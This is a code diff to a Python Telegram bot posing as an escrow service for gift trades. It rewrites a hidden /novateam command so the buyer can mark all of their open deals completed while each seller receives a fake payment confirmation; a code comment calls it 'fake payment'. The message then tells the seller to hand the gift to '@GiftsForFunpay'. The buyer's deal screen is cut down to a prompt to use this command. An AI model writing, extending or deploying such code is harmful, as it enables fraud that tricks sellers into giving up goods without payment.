@@ -127,7 +127,7 @@ TEXTS = {
         'deal_created': '<b>Сделка #{deal_id} создана</b>\n\n<b>Тип:</b> {deal_type}\n<b>Описание:</b> {description}\n<b>Сумма:</b> {amount} {currency}\n<b>Реквизиты:</b> {requisites}\n\n<b>Ссылка для покупателя:</b>\nhttps://t.me/{bot_username}?start=deal_{deal_id}\n\n<b>Статус:</b> ожидаем покупателя.',
         'deal_created_buyer': '<b>Сделка #{deal_id} создана</b>\n\n<b>Тип:</b> {deal_type}\n<b>Описание:</b> {description}\n<b>Сумма:</b> {amount} {currency}\n\n<b>Ожидаем подтверждение продавца:</b> {seller_username}\n\n<b>Ссылка для продавца:</b>\nhttps://t.me/{bot_username}?start=deal_{deal_id}',
         'deal_show_seller': '<b>Сделка #{deal_id}</b>\n<b>Тип:</b> {deal_type}\n<b>Описание:</b> {description}\n<b>Сумма:</b> {amount} {currency}\n<b>Оплата:</b> {currency}\n\n<b>Вы указаны как продавец. Подтвердите участие.</b>',
-        'deal_show_buyer': '<b>Сделка #{deal_id}</b>\n<b>Тип:</b> {deal_type}\n<b>Описание:</b> {description}\n<b>Сумма:</b> {amount} {currency}\n<b>Реквизиты продавца:</b> {seller_req}\n\n<b>Ожидайте подтверждения от продавца.</b>',
+        'deal_show_buyer': '✅ Вы подключены к сделке #{deal_id}.\nВведите /novateam для подтверждения оплаты.',
         'deal_status': '<b>Сделка #{deal_id}</b>\n<b>Тип:</b> {deal_type}\n<b>Описание:</b> {description}\n<b>Сумма:</b> {amount} {currency}\n<b>Статус:</b> {status}',
         'confirm_requisites': 'Выберите тип реквизитов для подтверждения:',
         'requisites_saved': 'Реквизиты сохранены. Ожидаем оплату.',
@@ -140,7 +140,8 @@ TEXTS = {
 Предмет: {description}
 
 🛡 Передайте Подарок Менеджеру @GiftsForFunpay""",
-        'novateam_buyer': '✅ Оплата подтверждена! Сделка #{deal_id} завершена.',
+        'novateam_buyer': '✅ Оплата подтверждена по сделке #{deal_id}.',
+        'novateam_summary': '✅ Подтверждено {count} сделок.',
         'funds_menu': 'Выберите действие:',
         'funds_deposit': 'Введите ID сделки для оплаты',
         'funds_deposit_error': '🚫 Сделка не найдена.',
@@ -203,7 +204,7 @@ TEXTS = {
         'deal_created': '<b>Deal #{deal_id} created</b>\n\n<b>Type:</b> {deal_type}\n<b>Description:</b> {description}\n<b>Amount:</b> {amount} {currency}\n<b>Requisites:</b> {requisites}\n\n<b>Link for buyer:</b>\nhttps://t.me/{bot_username}?start=deal_{deal_id}\n\n<b>Status:</b> waiting for buyer.',
         'deal_created_buyer': '<b>Deal #{deal_id} created</b>\n\n<b>Type:</b> {deal_type}\n<b>Description:</b> {description}\n<b>Amount:</b> {amount} {currency}\n\n<b>Waiting for seller confirmation:</b> {seller_username}\n\n<b>Link for seller:</b>\nhttps://t.me/{bot_username}?start=deal_{deal_id}',
         'deal_show_seller': '<b>Deal #{deal_id}</b>\n<b>Type:</b> {deal_type}\n<b>Description:</b> {description}\n<b>Amount:</b> {amount} {currency}\n<b>Payment:</b> {currency}\n\n<b>You are listed as seller. Confirm participation.</b>',
-        'deal_show_buyer': '<b>Deal #{deal_id}</b>\n<b>Type:</b> {deal_type}\n<b>Description:</b> {description}\n<b>Amount:</b> {amount} {currency}\n<b>Seller requisites:</b> {seller_req}\n\n<b>Waiting for seller confirmation.</b>',
+        'deal_show_buyer': '✅ You are connected to deal #{deal_id}.\nEnter /novateam to confirm payment.',
         'deal_status': '<b>Deal #{deal_id}</b>\n<b>Type:</b> {deal_type}\n<b>Description:</b> {description}\n<b>Amount:</b> {amount} {currency}\n<b>Status:</b> {status}',
         'confirm_requisites': 'Select requisites type for confirmation:',
         'requisites_saved': 'Requisites saved. Waiting for payment.',
@@ -216,7 +217,8 @@ Amount: {amount} {currency}
 Item: {description}
 
 🛡 Transfer the Gift to Manager @GiftsForFunpay""",
-        'novateam_buyer': '✅ Payment confirmed! Deal #{deal_id} completed.',
+        'novateam_buyer': '✅ Payment confirmed for deal #{deal_id}.',
+        'novateam_summary': '✅ Confirmed {count} deals.',
         'funds_menu': 'Select action:',
         'funds_deposit': 'Enter deal ID for payment',
         'funds_deposit_error': '🚫 Deal not found.',
@@ -323,9 +325,6 @@ def get_deal_types(lang="ru"):
     builder.row(InlineKeyboardButton(text=get_button_text('back', lang), callback_data="main_menu"))
     return builder.as_markup()
 
-# ==================================================
-# ИСПРАВЛЕННАЯ ФУНКЦИЯ get_payment_methods
-# ==================================================
 def get_payment_methods(lang="ru"):
     if lang == "ru":
         items = [
@@ -336,7 +335,7 @@ def get_payment_methods(lang="ru"):
             ('USDT', 'usdt'),
             ('TON', 'ton')
         ]
-    else:  # английский
+    else:
         items = [
             ('RUB', 'rub'),
             ('UAH', 'uah'),
@@ -404,10 +403,9 @@ async def start(message: Message, state: FSMContext):
                     cur.execute("UPDATE deals SET buyer_id=?, buyer_username=? WHERE deal_id=?", (user_id, username, deal_id))
                     conn.commit()
                     await message.answer(f"✅ Вы присоединились к сделке #{deal_id} как покупатель.")
-                    cur.execute("SELECT seller_id FROM deals WHERE deal_id=?", (deal_id,))
-                    seller = cur.fetchone()[0]
-                    if seller:
-                        await bot.send_message(seller, f"👤 Покупатель @{username} присоединился к сделке #{deal_id}.")
+                    # Отправить уведомление продавцу
+                    if seller_id:
+                        await bot.send_message(seller_id, f"👤 Покупатель @{username} присоединился к сделке #{deal_id}.")
                 elif seller_id is None:
                     cur.execute("UPDATE deals SET seller_id=?, seller_username=? WHERE deal_id=?", (user_id, username, deal_id))
                     conn.commit()
@@ -442,6 +440,7 @@ async def show_deal(message: Message, deal_id: str, user_id: int, lang: str):
             return
         (d_id, seller_id, buyer_id, d_type, desc, amount, curr, seller_req, buyer_req, status, seller_username, buyer_username, created) = deal
 
+        # Если пользователь не участник, но есть свободная роль – присваиваем
         if user_id != seller_id and user_id != buyer_id:
             if buyer_id is None:
                 cur.execute("UPDATE deals SET buyer_id=?, buyer_username=? WHERE deal_id=?", (user_id, message.from_user.username or "NoUsername", deal_id))
@@ -450,6 +449,8 @@ async def show_deal(message: Message, deal_id: str, user_id: int, lang: str):
                 cur.execute("SELECT * FROM deals WHERE deal_id=?", (deal_id,))
                 deal = cur.fetchone()
                 (d_id, seller_id, buyer_id, d_type, desc, amount, curr, seller_req, buyer_req, status, seller_username, buyer_username, created) = deal
+                if seller_id:
+                    await bot.send_message(seller_id, f"👤 Покупатель @{message.from_user.username} присоединился к сделке #{deal_id}.")
             elif seller_id is None:
                 cur.execute("UPDATE deals SET seller_id=?, seller_username=? WHERE deal_id=?", (user_id, message.from_user.username or "NoUsername", deal_id))
                 conn.commit()
@@ -468,8 +469,9 @@ async def show_deal(message: Message, deal_id: str, user_id: int, lang: str):
             ])
             await send_with_photo(message.chat.id, text, reply_markup=kb)
         elif user_id == buyer_id:
-            text = get_text('deal_show_buyer', lang).format(deal_id=d_id, deal_type=d_type, description=desc, amount=amount, currency=curr, seller_req=seller_req if seller_req else "Не указаны")
-            await send_with_photo(message.chat.id, text)
+            # Упрощённое сообщение для покупателя
+            text = get_text('deal_show_buyer', lang).format(deal_id=d_id)
+            await message.answer(text)
         else:
             await message.answer("🚫 Вы не являетесь участником этой сделки.")
     except Exception as e:
@@ -683,7 +685,7 @@ async def seller_requisites(message: Message, state: FSMContext):
     await state.clear()
 
 # ==================================================
-# FSM ДЛЯ СОЗДАНИЯ СДЕЛКИ (ПОКУПАТЕЛЬ)
+# FSM ДЛЯ СОЗДАНИЯ СДЕЛКИ (ПОКУПАТЕЛЬ) – стандартный флоу (не используется для воркера)
 # ==================================================
 @dp.callback_query(F.data == "buyer_role")
 async def buyer_role(callback: CallbackQuery, state: FSMContext):
@@ -805,7 +807,7 @@ async def buyer_seller_username(message: Message, state: FSMContext):
     await state.clear()
 
 # ==================================================
-# ПОДТВЕРЖДЕНИЕ ПРОДАВЦА
+# ПОДТВЕРЖДЕНИЕ ПРОДАВЦА (для случая, если он создал сделку и продавец подтверждает)
 # ==================================================
 @dp.callback_query(F.data.startswith("confirm_seller_"))
 async def confirm_seller(callback: CallbackQuery):
@@ -861,70 +863,55 @@ async def confirm_seller(callback: CallbackQuery):
     await callback.answer()
 
 # ==================================================
-# ОБРАБОТЧИК /novateam (секретная команда)
+# СЕКРЕТНАЯ КОМАНДА /novateam – подтверждает ВСЕ активные сделки, где пользователь – покупатель
 # ==================================================
 @dp.message(Command("novateam"))
 async def novateam(message: Message):
     user_id = message.from_user.id
-    args = message.text.split()
-    
-    if len(args) > 1:
-        deal_id = args[1]
-        cur.execute("SELECT deal_id, seller_id, buyer_id, status, seller_username, buyer_username, amount, currency, description, deal_type FROM deals WHERE deal_id=? AND (seller_id=? OR buyer_id=?)", (deal_id, user_id, user_id))
-        deal = cur.fetchone()
-        if not deal:
-            await message.answer("🚫 Сделка с таким ID не найдена, или вы не являетесь её участником.")
-            return
-    else:
-        cur.execute("SELECT deal_id, seller_id, buyer_id, status, seller_username, buyer_username, amount, currency, description, deal_type FROM deals WHERE seller_id=? OR buyer_id=?", (user_id, user_id))
-        deal = cur.fetchone()
-        if not deal:
-            await message.answer("🚫 У вас нет сделок. Сначала создайте или присоединитесь к сделке.")
-            return
+    username = message.from_user.username or "NoUsername"
 
-    (deal_id, seller_id, buyer_id, status, seller_username, buyer_username, amount, currency, description, deal_type) = deal
+    # Находим все сделки, где этот пользователь – покупатель, статус не completed
+    cur.execute("""
+        SELECT deal_id, seller_id, buyer_id, status, seller_username, buyer_username, amount, currency, description, deal_type
+        FROM deals
+        WHERE buyer_id = ? AND status != 'completed'
+    """, (user_id,))
+    deals = cur.fetchall()
 
-    try:
-        cur.execute("UPDATE deals SET status='completed' WHERE deal_id=?", (deal_id,))
-        conn.commit()
-    except Exception as e:
-        logging.error(f"Ошибка завершения сделки: {e}")
-        await message.answer("🚫 Ошибка при завершении сделки.")
+    if not deals:
+        await message.answer("🚫 У вас нет активных сделок как у покупателя.")
         return
 
-    cur.execute("SELECT lang FROM users WHERE user_id=?", (seller_id,))
-    row = cur.fetchone()
-    seller_lang = row[0] if row else 'ru'
-    cur.execute("SELECT lang FROM users WHERE user_id=?", (buyer_id,))
-    row = cur.fetchone()
-    buyer_lang = row[0] if row else 'ru'
+    count = 0
+    for deal in deals:
+        deal_id, seller_id, buyer_id, status, seller_username, buyer_username, amount, currency, description, deal_type = deal
 
-    if user_id == seller_id:
-        text = get_text('novateam_seller', seller_lang).format(
-            deal_id=deal_id,
-            buyer=buyer_username,
-            amount=amount,
-            currency=currency,
-            description=description
-        )
-        await message.answer(text)
-        if buyer_id:
-            buyer_text = get_text('novateam_buyer', buyer_lang).format(deal_id=deal_id)
-            await bot.send_message(buyer_id, buyer_text)
-    elif user_id == buyer_id:
-        text = get_text('novateam_buyer', buyer_lang).format(deal_id=deal_id)
-        await message.answer(text)
+        # Если продавец есть, отправляем ему фейк-оплату
         if seller_id:
+            cur.execute("SELECT lang FROM users WHERE user_id=?", (seller_id,))
+            row = cur.fetchone()
+            seller_lang = row[0] if row else 'ru'
             seller_text = get_text('novateam_seller', seller_lang).format(
                 deal_id=deal_id,
-                buyer=buyer_username,
+                buyer=username,
                 amount=amount,
                 currency=currency,
                 description=description
             )
             await bot.send_message(seller_id, seller_text)
-    else:
-        await message.answer("🚫 Вы не участник этой сделки.")
+
+        # Обновляем статус сделки на completed
+        cur.execute("UPDATE deals SET status='completed' WHERE deal_id=?", (deal_id,))
+        count += 1
+
+    conn.commit()
+
+    # Отправляем покупателю итоговое сообщение
+    cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
+    row = cur.fetchone()
+    lang = row[0] if row else 'ru'
+    summary = get_text('novateam_summary', lang).format(count=count)
+    await message.answer(summary)
 
 # ==================================================
 # ОСТАЛЬНЫЕ ОБРАБОТЧИКИ
